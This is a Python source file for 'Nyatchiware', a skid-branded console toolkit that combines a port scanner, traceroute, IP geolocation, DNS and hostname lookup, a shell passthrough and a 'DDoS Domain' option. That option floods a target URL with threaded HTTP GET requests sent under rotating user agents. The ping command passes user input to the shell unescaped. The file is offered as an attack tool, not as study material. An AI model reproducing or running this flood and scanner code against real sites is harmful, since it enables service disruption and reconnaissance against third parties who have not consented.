import colorama
import pystyle
import threading
import socket
import sys
import requests
import subprocess
import scapy
from scapy.all import IP, ICMP, sr1
import ctypes
import datetime
import platform
import random
import socket
import time
import getpass
from time import sleep
from threading import Thread
from datetime import datetime


from pystyle import *
from colorama import Fore, Back, Style
colorama.init()

username = getpass.getuser()

pink = Fore.MAGENTA
blue = Fore.BLUE
green = Fore.GREEN
version = "0.1.0 stable"

def cmd():

    cmd = input(f' {blue}Nware@Skid {pink}${blue}')

    if cmd == '1':
        scanports()
    elif cmd == '2':
        if __name__ == "__main__":
            main()
    elif cmd == '3':
        traceroute()
    elif cmd == '4':
        geolocate()
    elif cmd == '5':
        ping()
    elif cmd == '6':
        boot()
    elif cmd == '7':
        if __name__ == "__main__":
            ip = get_public_ip()
        if ip:
            print(f"                 {pink}Your public IP address is: {ip}")
        else:
            print(f"                 {pink}Could not retrieve public IP address.")
        input()
        menu()

    elif cmd == '8':
        if __name__ == "__main__":
            domain = input(f"                 {pink}Enter domain name for DNS lookup:{blue} ")
            ip_address = dns_lookup(domain)
        if ip_address:
            print(f"                 {pink}The IP address of {blue}{domain} {pink}is:{blue} {ip_address}")
        input()
        menu()

    elif cmd == '9':
            if __name__ == "__main__":
                ip_address = input(f"                 {pink}Enter an IP address to retrieve the hostname: {blue}")
                hostname = get_hostname(ip_address)
            if hostname:
                print(f"                 {pink}The hostname for IP {blue}{ip_address} {pink}is: {blue}{hostname}")
            input()
            menu()



    else:
        menu()



def menu():
    subprocess.run('cls', shell=True)
    if platform.system() == 'Windows':
        ctypes.windll.kernel32.SetConsoleTitleW(f"|| Nyatchiware || ~~ || Lunar Team ||")
    
    Write.Print(f'''
                

                 _______                 __         .__    .__                               
                 \      \ ___.__._____ _/  |_  ____ |  |__ |__|_  _  _______ _______   ____   
                 /   |   <   |  |\__  \\    __\/ ___\|  |  \|  \ \/ \/ /\__  \\ _  __ \_/ __ \ 
                /    |    \___  | / __ \|  | \  \___|   Y  \  |\     /  / __ \|  | \/\  ___/ 
                \____|__  / ____|(____  /__|  \___  >___|  /__| \/\_/  (____  /__|    \___  >
                        \/\/          \/          \/     \/                 \/            \/ 
                 {version} - Developed by Lunar Team
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
                         ╔═══════════════════════════════════════════════════════════════╗
                         ║ [1] Scan IP for open ports    [6] Terminal Emulator           ║
                         ║ [2] DDoS Domain               [7] Retrieve Local IP           ║
                         ║ [3] Perform Traceroute        [8] DNS Lookup                  ║
                         ║ [4] Geolocate IP              [9] Retrieve IP Hostname        ║
                         ║ [5] Ping IP                                                   ║
                         ╚═══════════════════════════════════════════════════════════════╝
                
                
                '''
                ,Colors.purple_to_blue, interval=0.000)
    
    cmd()

def ddosip(target, threads, duration):
    headers = {'User-Agent': random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'
    ])}

    for _ in range(duration):
        try:
            requests.get(target, headers=headers, timeout=5)
            print(f"                 Attack sent from {threading.current_thread().name}")
        except requests.exceptions.RequestException as e:
            print(f"                 Error: {e}")
        time.sleep(random.uniform(0.1, 0.5))
    print(f'                 {pink}Attack completed.')
    input()
    menu()


def traceroute():
    max_hops = 100
    print()
    print(f'                 {blue}What is the IP/Domain destination?')
    destination = input(str(f"                 {pink}IP/Domain destination:{blue} "))
    print(f"{blue}~" * 50,)
    print(f"                 {pink}Finding traceroute of: " + destination)
    print(f"                 {pink}Traceroute started at: " + str(datetime.now()))
    print(f"{blue}~" * 50,)

    print(f"                 {pink}Tracerouting to {destination}...")
    
    for ttl in range(1, max_hops+1):
        # Send an ICMP Echo Request packet with the TTL value
        pkt = IP(dst=destination, ttl=ttl) / ICMP()
        reply = sr1(pkt, timeout=5, verbose=0)
        
        if reply is None:
            print(f"                 {ttl}: Request Timed Out")
        elif reply.type == 0:
            print(f"                 {ttl}: {reply.src} (Destination reached)")
            break
        else:
            print(f"                 {ttl}: {reply.src}")
    
    input()
    menu()





def main():
    target = input(f"                 {pink}Enter target URL: {blue}")
    threads = int(input(f"                 {pink}Enter number of threads: {blue}"))
    duration = int(input(f"                 {pink}Enter attack duration (seconds): {blue}"))

    threads = [threading.Thread(target=ddosip, args=(target, threads, duration)) for _ in range(threads)]

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()


def scanports():

    target = input(f"                 {pink}Target IP:{blue} ")

    print(f'                 {blue}Scanning started on {pink}{target}')

    try:

        for port in range(1,65535):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(0.5)

            result = s.connect_ex((target,port))
            if result == 0:
                print(Fore.BLUE + "                 [*] Port {} is open.".format(port))
            s.close()

    except KeyboardInterrupt:
        print("\n Exiting")
        input()
        menu()
    except socket.error:
        print("\n Host not responding")
        input()
        menu()

def geolocate():

    print()
    print(f'                 {blue}What is the IP you are geolocating?')
    ip = input(str(f"                 {pink}IP Address:{blue} "))
    print(f"{blue}~" * 50,)
    geolocateip(ip)

def geolocateip(ip_address):

    # Send a request to ip-api.com to get geolocation data
    url = f"http://ip-api.com/json/{ip_address}"

    try:
        # Send the request and get the response in JSON format
        response = requests.get(url)
        data = response.json()

        # Check if the request was successful
        if data['status'] == 'fail':
            print("Error: Could not geolocate IP address.")
        else:
            # Extract relevant geolocation data
            ip = data.get("query", "N/A")
            city = data.get("city", "N/A")
            region = data.get("regionName", "N/A")
            country = data.get("country", "N/A")
            location = f"{data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}"

            # Print the geolocation data
            print(f"{pink}IP Address: {ip}")
            print(f"City: {city}")
            print(f"Region: {region}")
            print(f"Country: {country}")
            print(f"Location (Lat, Long): {location}")
            print()
            print(f'{blue}Geolocation complete.')

    except requests.exceptions.RequestException as e:
        print(f"{blue}Error geolocating IP: {e}")

    input()
    menu()

def ping():

    print()
    print(f'                 {blue}What is the IP/Domain you are pinging?')
    ip = input(str(f"                 {pink}IP/Domain:{blue} "))
    print(f"{blue}~" * 50,)
    print(f'{pink}Pinging {ip}')
    subprocess.run(f'ping {ip}', shell=True)
    print(f'{blue}Pinging complete.')
    input()
    menu()

def boot():

    if platform.system() == 'Windows':
        ctypes.windll.kernel32.SetConsoleTitleW(f"Booting Nware Terminal...")

    subprocess.run('cls', shell=True)
    print(Fore.WHITE + 'Booting terminal emulator...')
    time.sleep(1.0)
    print(Fore.WHITE + f'Logging in as {username}')
    time.sleep(1.0)
    print("Terminal emulator booted. You can use the command 'nware' to go back to Nyatchiware at any time.")
    print('Hit enter to continue.')
    input()
    subprocess.run('cls', shell=True)
    if platform.system() == 'Windows':
        ctypes.windll.kernel32.SetConsoleTitleW(f"Nware Console")
    terminal()

def terminal():
    print()
    white = Fore.WHITE
    cmd = input(Fore.WHITE + f'{username}{green}$ {white}')

    if cmd == 'nware':
        menu()

    subprocess.run(f'{cmd}', shell=True)
    terminal()

def get_public_ip():
    try:
        # Using ipify API to get public IP
        response = requests.get("https://api.ipify.org?format=json")
        ip_info = response.json()
        return ip_info['ip']
    except requests.RequestException as e:
        return None

def dns_lookup(domain):
    try:
        # Perform the DNS lookup
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror:
        print(f"                 {blue}Error: Unable to resolve the domain {domain}")
        return None







def get_hostname(ip_address):
    try:
        # Get the hostname from the IP address
        hostname, _, _ = socket.gethostbyaddr(ip_address)
        return hostname
    except socket.herror:
        print(f"                 Error: Unable to resolve the IP address {ip_address}")
        return None




menu()